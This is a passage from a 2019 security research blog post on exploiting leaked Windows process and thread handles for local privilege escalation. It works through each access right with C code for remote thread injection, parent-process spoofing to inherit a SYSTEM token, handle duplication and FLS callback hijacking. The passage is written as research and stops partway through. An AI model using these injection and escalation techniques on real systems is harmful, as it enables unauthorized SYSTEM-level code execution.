
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Exploiting Leaked Process and Thread Handles - </title>
  <meta name="author" content="Bryan Alexander">

  
  <meta name="description" content="Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
particularly fun to toy with, as the handles aren&rsquo;t &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
  

</head>

<body   class="collapse-sidebar sidebar-footer" >
  <!--<header role="banner"><hgroup>
  <h1><a href="/"></a></h1>
  
</hgroup>

</header>-->
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:hatRiot.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Home</a></li>
  <li><a href="/other">Other</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Exploiting Leaked Process and Thread Handles</h1>
    
    
      <p class="meta">
        








  


<time datetime="2019-08-22T14:10:04-07:00" pubdate data-updated="true">Aug 22<span>nd</span>, 2019</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
particularly fun to toy with, as the handles aren&rsquo;t always granted
<code>PROCESS_ALL_ACCESS</code> or <code>THREAD_ALL_ACCESS</code>, requiring a bit more ingenuity.
This post will address the various access rights assignable to handles and what we
can do to exploit them to gain elevated code execution. I&rsquo;ve chosen to focus
specifically on process and thread handles as this seems to be the most common,
but surely other objects can be exploited in similar manner.</p>

<p>As background, while this bug can occur under various circumstances, I&rsquo;ve most
commonly seen it manifest when some privileged process opens a handle with
<code>bInheritHandle</code> set to true. Once this happens, any child process of this
privileged process inherits the handle and all access it grants. As example,
assume a SYSTEM level process does this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());</span></code></pre></td></tr></table></div></figure>


<p>Since it&rsquo;s allowing the opened handle to be inherited, any child process
will gain access to it. If they execute userland code impersonating the desktop
user, as a service might often do, those userland processes will have access to
that handle.</p>

<h2>Existing bugs</h2>

<p>There are several public bugs we can point to over the years as example and
inspiration. As per usual James Forshaw has a fun one from 2016[0] in which
he&rsquo;s able to leak a privileged thread handle out of the secondary logon
service with <code>THREAD_ALL_ACCESS</code>. This is the most &ldquo;open&rdquo; of permissions, but
he exploited it in a novel way that I was unaware of, at the time.</p>

<p>Another one from Ivan Fratric exploited[1] a leaked process handle with
<code>PROCESS_DUP_HANDLE</code>, which even Microsoft knew was bad. In his <code>Bypassing
Mitigations by Attacking JIT Server in Microsoft Edge</code> whitepaper, he
identifies the JIT server process mapping memory into the content process. To
do this, the JIT process needs a handle to it. The content process calls
<code>DuplicateHandle</code> on itself with the <code>PROCESS_DUP_HANDLE</code>, which can be
exploited to obtain a full access handle.</p>

<p>A more recent example is a Dell LPE [2] in which a <code>THREAD_ALL_ACCESS</code> handle
was obtained from a privileged process. They were able to exploit this via a
dropped DLL and an APC.</p>

<h2>Setup</h2>

<p>In this post, I wanted to examine all possible access rights to determine which
were exploitable on there own and which were not. Of those that were not, I
tried to determine what concoction of privileges were necessary to make it so.
I&rsquo;ve tried to stay &ldquo;realistic&rdquo; here in my experience, but you never know what
you&rsquo;ll find in the wild, and this post reflects that.</p>

<p>For testing, I created a simple client and server: a privileged server that
leaks a handle, and a client capable of consuming it. Here&rsquo;s the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include "pch.h"
</span><span class='line'>#include &lt;iostream&gt;
</span><span class='line'>#include &lt;Windows.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>    if (argc &lt;= 1) {
</span><span class='line'>        printf("[-] Please give me a target PID\n");
</span><span class='line'>        return -1;
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    HANDLE hUserToken, hUserProcess;
</span><span class='line'>    HANDLE hProcess, hThread;
</span><span class='line'>    STARTUPINFOA si;
</span><span class='line'>    PROCESS_INFORMATION pi;
</span><span class='line'>
</span><span class='line'>    ZeroMemory(&si, sizeof(si));
</span><span class='line'>    si.cb = sizeof(si);
</span><span class='line'>    ZeroMemory(&pi, sizeof(pi));
</span><span class='line'>
</span><span class='line'>    hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
</span><span class='line'>    if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &hUserToken)) {
</span><span class='line'>        printf("[-] Failed to open user process: %d\n", GetLastError());
</span><span class='line'>        CloseHandle(hUserProcess);
</span><span class='line'>        return -1;
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
</span><span class='line'>    printf("[+] Process: %x\n", hProcess);
</span><span class='line'>
</span><span class='line'>    CreateProcessAsUserA(hUserToken, 
</span><span class='line'>        "VulnServiceClient.exe", 
</span><span class='line'>        NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
</span><span class='line'>    SuspendThread(hThread);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>In the above, I&rsquo;m grabbing a handle to the token we want to impersonate,
opening an inheritable handle to the current process (which we&rsquo;re running as
SYSTEM), then spawning a child process. This child process is simply my client
application, which will go about attempting to exploit the handle.</p>

<p>The client is, of course, a little more involved. The only component that needs
a little discussion up front is fetching the leaked handle. This can be done
via <code>NtQuerySystemInformation</code> and does not require any special privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void ProcessHandles()
</span><span class='line'>{
</span><span class='line'>    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
</span><span class='line'>    _NtQuerySystemInformation NtQuerySystemInformation =
</span><span class='line'>        (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
</span><span class='line'>    _NtDuplicateObject NtDuplicateObject =
</span><span class='line'>        (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
</span><span class='line'>    _NtQueryObject NtQueryObject =
</span><span class='line'>        (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
</span><span class='line'>    _RtlEqualUnicodeString RtlEqualUnicodeString =
</span><span class='line'>        (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");
</span><span class='line'>    _RtlInitUnicodeString RtlInitUnicodeString = 
</span><span class='line'>        (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
</span><span class='line'>
</span><span class='line'>    ULONG handleInfoSize = 0x10000;
</span><span class='line'>    NTSTATUS status;
</span><span class='line'>    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
</span><span class='line'>    DWORD dwPid = GetCurrentProcessId();
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    printf("[+] Looking for process handles...\n");
</span><span class='line'>
</span><span class='line'>    while ((status = NtQuerySystemInformation(
</span><span class='line'>        SystemHandleInformation,
</span><span class='line'>        phHandleInfo,
</span><span class='line'>        handleInfoSize,
</span><span class='line'>        NULL
</span><span class='line'>    )) == STATUS_INFO_LENGTH_MISMATCH)
</span><span class='line'>        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);
</span><span class='line'>
</span><span class='line'>    if (status != STATUS_SUCCESS)
</span><span class='line'>    {
</span><span class='line'>        printf("NtQuerySystemInformation failed!\n");
</span><span class='line'>        return;
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    printf("[+] Fetched %d handles\n", phHandleInfo-&gt;HandleCount);
</span><span class='line'>
</span><span class='line'>    // iterate handles until we find the privileged process
</span><span class='line'>    for (int i = 0; i &lt; phHandleInfo-&gt;HandleCount; ++i)
</span><span class='line'>    {
</span><span class='line'>        SYSTEM_HANDLE handle = phHandleInfo-&gt;Handles[i];
</span><span class='line'>        POBJECT_TYPE_INFORMATION objectTypeInfo;
</span><span class='line'>        PVOID objectNameInfo;
</span><span class='line'>        UNICODE_STRING objectName;
</span><span class='line'>        ULONG returnLength;
</span><span class='line'>
</span><span class='line'>        // Check if this handle belongs to the PID the user specified
</span><span class='line'>        if (handle.ProcessId != dwPid)
</span><span class='line'>            continue;
</span><span class='line'>
</span><span class='line'>        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
</span><span class='line'>        if (NtQueryObject(
</span><span class='line'>            (HANDLE)handle.Handle,
</span><span class='line'>            ObjectTypeInformation,
</span><span class='line'>            objectTypeInfo,
</span><span class='line'>            0x1000,
</span><span class='line'>            NULL
</span><span class='line'>        ) != STATUS_SUCCESS)
</span><span class='line'>            continue;
</span><span class='line'>
</span><span class='line'>        if (handle.GrantedAccess == 0x0012019f)
</span><span class='line'>        {
</span><span class='line'>            free(objectTypeInfo);
</span><span class='line'>            continue;
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        objectNameInfo = malloc(0x1000);
</span><span class='line'>        if (NtQueryObject(
</span><span class='line'>            (HANDLE)handle.Handle,
</span><span class='line'>            ObjectNameInformation,
</span><span class='line'>            objectNameInfo,
</span><span class='line'>            0x1000,
</span><span class='line'>            &returnLength
</span><span class='line'>        ) != STATUS_SUCCESS)
</span><span class='line'>        {
</span><span class='line'>            objectNameInfo = realloc(objectNameInfo, returnLength);
</span><span class='line'>            if (NtQueryObject(
</span><span class='line'>                (HANDLE)handle.Handle,
</span><span class='line'>                ObjectNameInformation,
</span><span class='line'>                objectNameInfo,
</span><span class='line'>                returnLength,
</span><span class='line'>                NULL
</span><span class='line'>            ) != STATUS_SUCCESS)
</span><span class='line'>            {
</span><span class='line'>                free(objectTypeInfo);
</span><span class='line'>                free(objectNameInfo);
</span><span class='line'>                continue;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        // check if we've got a process object; there should only be one, but should we 
</span><span class='line'>        // have multiple, this is where we'd perform the checks
</span><span class='line'>        objectName = *(PUNICODE_STRING)objectNameInfo;
</span><span class='line'>        UNICODE_STRING pProcess, pThread;
</span><span class='line'>
</span><span class='line'>        RtlInitUnicodeString(&pThread, L"Thread");
</span><span class='line'>        RtlInitUnicodeString(&pProcess, L"Process");
</span><span class='line'>        if (RtlEqualUnicodeString(&objectTypeInfo-&gt;Name, &pProcess, TRUE) && TARGET == 0) {
</span><span class='line'>            printf("[+] Found process handle (%x)\n", handle.Handle);
</span><span class='line'>            HANDLE hProcess = (HANDLE)handle.Handle;
</span><span class='line'>        }
</span><span class='line'>        else if (RtlEqualUnicodeString(&objectTypeInfo-&gt;Name, &pThread, TRUE) && TARGET == 1) {
</span><span class='line'>            printf("[+] Found thread handle (%x)\n", handle.Handle);
</span><span class='line'>            HANDLE hThread = (HANDLE)handle.Handle;
</span><span class='line'>        else
</span><span class='line'>            continue;
</span><span class='line'>        
</span><span class='line'>        free(objectTypeInfo);
</span><span class='line'>        free(objectNameInfo);
</span><span class='line'>    }
</span><span class='line'>} </span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re essentially just fetching all system handles, filtering down to ones
belonging to our process, then hunting for a thread or a process. In a more
active client process with many threads or process handles we&rsquo;d need to filter
down further, but this is sufficient for testing.</p>

<p>The remainder of this post will be broken down into process and thread security
access rights.</p>

<h2>Process</h2>

<p>There are approximately 14 process-specific rights[3]. We&rsquo;re going to ignore
the standard object access rights for now (DELETE, READ_CONTROL, etc.) as they
apply more to the handle itself than what it allows one to do.</p>

<p>Right off the bat, we&rsquo;re going to dismiss the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_QUERY_INFORMATION
</span><span class='line'>PROCESS_QUERY_LIMITED_INFORMATION
</span><span class='line'>PROCESS_SUSPEND_RESUME
</span><span class='line'>PROCESS_TERMINATE
</span><span class='line'>PROCESS_SET_QUOTA
</span><span class='line'>PROCESS_VM_OPERATION
</span><span class='line'>PROCESS_VM_READ
</span><span class='line'>SYNCHRONIZE</span></code></pre></td></tr></table></div></figure>


<p>To be clear I&rsquo;m only suggesting that the above access rights cannot be
exploited on their own; they are, of course, very useful when roped in with
others. There may be weird edge cases in which one of these might be useful
(PROCESS_TERMINATE, for example), but barring any magic, I don&rsquo;t see how.</p>

<p>That leaves the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_ALL_ACCESS
</span><span class='line'>PROCESS_CREATE_PROCESS
</span><span class='line'>PROCESS_CREATE_THREAD
</span><span class='line'>PROCESS_DUP_HANDLE
</span><span class='line'>PROCESS_SET_INFORMATION
</span><span class='line'>PROCESS_VM_WRITE</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ll run through each of these individually.</p>

<h3>PROCESS_ALL_ACCESS</h3>

<p>The most obvious of them all, this one grants us access to it all. We can
simply allocate memory and create a thread to obtain code execution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>char payload[] = "\xcc\xcc";
</span><span class='line'>LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</span><span class='line'>WriteProcessMemory(hProcess, lpBuf, payload, 2, NULL);
</span><span class='line'>CreateRemoteThread(hProcess, NULL, 0, lpBuf, 0, 0, NULL);</span></code></pre></td></tr></table></div></figure>


<p>Nothing to it.</p>

<h3>PROCESS_CREATE_PROCESS</h3>

<p>This right is &ldquo;required to create a process&rdquo;, which is to say that we can spawn
child processes. To do this remotely, we just need to spawn a process and set
its parent to the privileged process we&rsquo;ve got a handle to. This will create
the new process and inherit its parent token which will hopefully be a SYSTEM
token.</p>

<p>Here&rsquo;s how we do that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STARTUPINFOEXA sinfo = { sizeof(sinfo) };
</span><span class='line'>PROCESS_INFORMATION pinfo;
</span><span class='line'>LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
</span><span class='line'>SIZE_T bytes;
</span><span class='line'>
</span><span class='line'>sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
</span><span class='line'>InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
</span><span class='line'>ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
</span><span class='line'>InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
</span><span class='line'>
</span><span class='line'>UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPrivProc, sizeof(HANDLE), NULL, NULL);
</span><span class='line'>sinfo.lpAttributeList = ptList;
</span><span class='line'>
</span><span class='line'>CreateProcessA("cmd.exe", (LPSTR)"cmd.exe /c calc.exe", 
</span><span class='line'>        NULL, NULL, TRUE, 
</span><span class='line'>        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
</span><span class='line'>        &sinfo.StartupInfo, &pinfo);</span></code></pre></td></tr></table></div></figure>


<p>We should now have calc running with the privileged token. Obviously we&rsquo;d want
to replace that with something more useful!</p>

<h3>PROCESS_CREATE_THREAD</h3>

<p>Here we&rsquo;ve got the ability to use <code>CreateRemoteThread</code>, but can&rsquo;t control any
memory in the target process. There are of course ways we can influence memory
without direct write access, such as WNF, but we&rsquo;d still have no way of
resolving those addresses. As it turns out, however, we don&rsquo;t need the control.
<code>CreateRemoteThread</code> can be pointed at a function with a single argument, which
gives us quite a bit of control. <code>LoadLibraryA</code> and <code>WinExec</code> are both great
candidates for executing child processes or loading arbitrary code.</p>

<p>As example, there&rsquo;s an ANSI <code>cmd.exe</code> located in msvcrt.dll at offset 0x503b8.
We can pass this as an argument to <code>CreateRemoteThread</code> and trigger a <code>WinExec</code>
call to pop a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DWORD dwCmd = (GetModuleBaseAddress(GetCurrentProcessId(), L"msvcrt.dll") + 0x503b8);
</span><span class='line'>HANDLE hThread = CreateRemoteThread(hPrivProc, NULL, 0,
</span><span class='line'>                        (LPTHREAD_START_ROUTINE)WinExec, 
</span><span class='line'>                        (LPVOID)dwCmd, 
</span><span class='line'>                        0, NULL);</span></code></pre></td></tr></table></div></figure>


<p>We can do something similar for <code>LoadLibraryA</code>. This of course is predicated on
the system path containing a writable directory for our user.</p>

<h3>PROCESS_DUP_HANDLE</h3>

<p>Microsoft&rsquo;s own documentation on process security and access rights points to
this specifically as a sensitive right. Using it, we can simply duplicate our
process handle with <code>PROCESS_ALL_ACCESS</code>, allowing us full RW to its address
space. As per Ivan Fratric&rsquo;s JIT bug, it&rsquo;s as simple as this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE hDup = INVALID_HANDLE_VALUE;
</span><span class='line'>DuplicateHandle(hPrivProc, GetCurrentProcess(), GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, 0, 0)</span></code></pre></td></tr></table></div></figure>


<p>Now we can simply follow the WriteProcessMemory/CreateRemoteThread strategy for
executing arbitrary code.</p>

<h3>PROCESS_SET_INFORMATION</h3>

<p>Granting this permission allows one to execute <code>SetInformationProcess</code> in
addition to several fields in <code>NtSetInformationProcess</code>. The latter is far more
powerful, but many of the <code>PROCESSINFOCLASS</code> fields available are either read
only or require additional privileges to actually set (<code>SeDebugPrivilege</code> for
<code>ProcessExceptionPort</code> and <code>ProcessInstrumentationCallback</code>(win7) for
example). Process Hacker[15] maintains an up to date definition of this class
and its members.</p>

<p>Of the available flags, none were particularly interesting on their own. I
needed to add <code>PROCESS_VM_*</code> privileges in order to make any usable and at
that point we defeat the purpose.</p>

<h3>PROCESS_VM_*</h3>

<p>This covers the three flavors of VM access: WRITE/READ/OPERATION. The first two
should be self-explanatory and the third allows one to operate on the virtual
address space itself, such as changing page protections (VirtualProtectEx) or
allocating memory (VirtualAllocEx). I won&rsquo;t address each permutation of these
three, but I think it&rsquo;s reasonable to assume that <code>PROCESS_VM_WRITE</code> is a
necessary requirement. While <code>PROCESS_VM_OPERATION</code> allows us to crash the
remote process which could open up other flaws, it&rsquo;s not a generic nor elegant
approach. Ditto with <code>PROCESS_VM_READ</code>.</p>

<p><code>PROCESS_VM_WRITE</code> proved to be a challenge on its own, and I was unable to
come up with a generic solution. At first blush, the entire set of
Shatter-like injection strategies documented by Hexacorn[12] seem like
they&rsquo;d be perfect. They simply require the remote process to use windows,
clipboard registrations, etc. None of these are guaranteed, but chances are one
is bound to exist. Unfortunately for us, many of them restrict access across
sessions or scaling integrity levels. We can write into the remote process,
but we need some way to gain control over execution flow.</p>

<p>In addition to being unable to modify page permissions, we cannot read nor
map/allocate memory. There are plenty of ways we can leak memory from the
remote process without directly interfacing with it, however.</p>

<p>Using <code>NtQuerySystemInformation</code>, for example, we can enumerate all threads
inside a remote process regardless of its IL. This grants us a list of
<code>SYSTEM_EXTENDED_THREAD_INFORMATION</code> objects which contain, among other
things, the address of the TEB. <code>NtQueryInformationProcess</code> allows us to fetch
the remote process PEB address. This latter API requires the
<code>PROCESS_QUERY_INFORMATION</code> right, however, which ended up throwing a major
wrench in my plan. Because of this I&rsquo;m appending <code>PROCESS_QUERY_INFORMATION</code>
onto <code>PROCESS_VM_WRITE</code> which gives us the necessary components to pull this
off. If someone knows of a way to leak the address of a remote process PEB
without it, I&rsquo;d love to hear.</p>

<p>The approach I took was a bit loopy, but it ended up working reliably and
generically. If you&rsquo;ve read my previous post on fiber local storage (FLS)[13],
this is the research I was referring to. If you haven&rsquo;t, I recommend giving it
a brief read, but I&rsquo;ll regurgitate a bit of it here.</p>

<p>Briefly, we can abuse fibers and FLS to overwrite callbacks which are executed
&ldquo;&hellip;on fiber deletion, thread exit, and when an FLS index is freed&rdquo;. The
primary thread of a process will always setup a fiber, thus there will always
be a callback for us to overwrite (msvcrt!_freefls). Callbacks are stored in
the PEB (FlsCallback) and the fiber local storage in the TEB (FlsData). By
smashing the FlsCallback we can obtain control over execution flow when one of
the fiber actions are taken.</p>

<p>With only write access to the process, however, this becomes a bit convoluted.
We cannot allocate memory and so we need some known location to put the
payload. In addition, the FlsCallback and FlsData variables in PEB/TEB are
pointers and we&rsquo;re unable to read these.</p>

<p>Stashing the payload turned out to be pretty simple. Since we&rsquo;ve established
we can leak PEB/TEB addresses we already have two powerful primitives. After
looking over both structures, I found that thread local storage (TLS) happened
to provide us with enough room to store ROP gadgets and a thin payload. TLS is
embedded within the structure itself, so we can simply offset into the TEB
address (which we have). If you&rsquo;re unfamiliar with TLS, Skywing&rsquo;s write-ups are
fantastic and have aged well[14].</p>

<p>Gaining control over the callback was a little trickier. A pointer to a
<code>_FLS_CALLBACK_INFO</code> structure is stored in the PEB (FlsCallback) and is an
opaque structure. Since we can&rsquo;t actually read this pointer, we have no simple
way of overwriting the pointer. Or do we?</p>

<p>What I ended up doing is overwriting the FlsCallback pointer itself in the PEB,
essentially creating my own fake <code>_FLS_CALLBACK_INFO</code> structure in TLS. It&rsquo;s a
pretty simple structure and really only has one value of importance: the
callback pointer.</p>

<p>In addition, as per the FLS article, we also need to take control over ECX/RCX.
This will allow us to stack pivot and continue executing our ROP payload. This
requires that we update the <code>TEB-&gt;FlsData</code> entry which we also are unable to
do, since it&rsquo;s a pointer. Much like <code>FlsCallback</code>, though, I was able to just
overwrite this value and craft my own data structure, which also turned out to
be pretty simple. The TLS buffer ended up looking like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>//
</span><span class='line'>// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
</span><span class='line'>// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
</span><span class='line'>// 32 ] 41414141 41414141 41414141 41414141 
</span><span class='line'>//</span></code></pre></td></tr></table></div></figure>


<p>There just so happens to be a perfect stack pivot gadget located in
